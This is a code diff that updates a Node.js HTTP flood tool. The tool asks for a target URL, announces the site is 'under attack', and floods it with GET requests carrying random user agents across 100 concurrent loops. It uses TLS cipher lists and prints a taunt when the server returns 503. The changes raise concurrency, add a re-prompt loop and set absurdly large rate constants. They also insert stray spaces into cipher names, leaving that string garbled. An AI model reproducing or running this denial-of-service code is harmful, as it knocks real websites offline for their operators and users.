@@ -50,7 +50,7 @@ const refers = [
 const cplist = [
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
-    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE -RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
+    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384 :ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256 :ECDHE -RSA-AES128-SHA:E CDHE-ECDSA-AES128-S HA :ECDHE -RSA-AES256 -SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
 ];
 
@@ -162,51 +162,56 @@ console.log(`\x1b[31m
 \x1b[0m
 `);
 
-rl.question(`\x1b[31m┌─[ \x1b[32m[TARGET URL]\x1b[31m ]─────[ # ]\x1b[0m\n\x1b[31m└─[ \x1b[32m\W\x1b[31m ]────► \x1b[0m`, (url) => {
-    let continueAttack = true;
-    const maxRequests = 1000000000;
-    const requestsPerSecond = 100000;
+function askForUrl() {
+    rl.question(`\x1b[31m┌─[ \x1b[32m[TARGET URL]\x1b[31m ]─────[ # ]\x1b[0m\n\x1b[31m└─[ \x1b[32m\W\x1b[31m ]────► \x1b[0m`, (url) => {
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            console.log("Invalid URL. Please enter a valid URL.");
+            askForUrl();
+        } else {           console.log(`\n\n\x1b[31mWebsite is under attack: ${url}\x1b[0m`);
+            let continueAttack = true;
+            const maxRequests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+            const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
 
-    const attack = () => {
-        try {
-            if (!continueAttack) return;
+            const attack = () => {
+                try {
+                    if (!continueAttack) return;
 
-            const userAgent = randElement(userAgents);
-            const headers = {
-                'User-Agent': userAgent
+                    const userAgent = randElement(userAgents);
+                    const headers = {
+                        'User-Agent': userAgent
+                    };
+
+                    axios.get(url, { headers })
+                        .then((response) => {
+                            if (response.status === 503) {
+                                console.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
+                            } else {
+                            }
+                        })
+                        .catch((error) => {
+                            if (error.response && error.response.status === 502) {
+                            }
+                        });
+
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                } catch (error) {
+                    console.log("Error: " + error.message);
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                }
             };
 
-            axios.get(url, { headers })
-                .then((response) => {
-                    if (response.status === 503) {
-                        console.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
-                    } else {
-                    }
-                })
-                .catch((error) => {
-                    if (error.response && error.response.status === 502) {
-                        console.log("Error: Request failed with status code 502");
-                    } else {
-                        console.log("Error: " + error.message);
-                    }
-                });
+            const numThreads = 100;
+            for (let i = 0; i < numThreads; i++) {
+                attack();
+            }
 
-            setTimeout(attack, 1000 / requestsPerSecond);
-        } catch (error) {
-            console.log("Error: " + error.message);
-            setTimeout(attack, 1000 / requestsPerSecond);
+            setTimeout(() => {
+                continueAttack = false;
+                console.log('Max requests reached.');
+                askForUrl();
+            }, maxRequests / requestsPerSecond * 1000);
         }
-    };
+    });
+}
 
-    const numThreads = 10;
-    for (let i = 0; i < numThreads; i++) {
-        attack();
-    }
-
-    setTimeout(() => {
-        continueAttack = false;
-        console.log('Max requests reached.');
-    }, maxRequests / requestsPerSecond * 1000);
-
-    rl.close();
-});
+askForUrl();
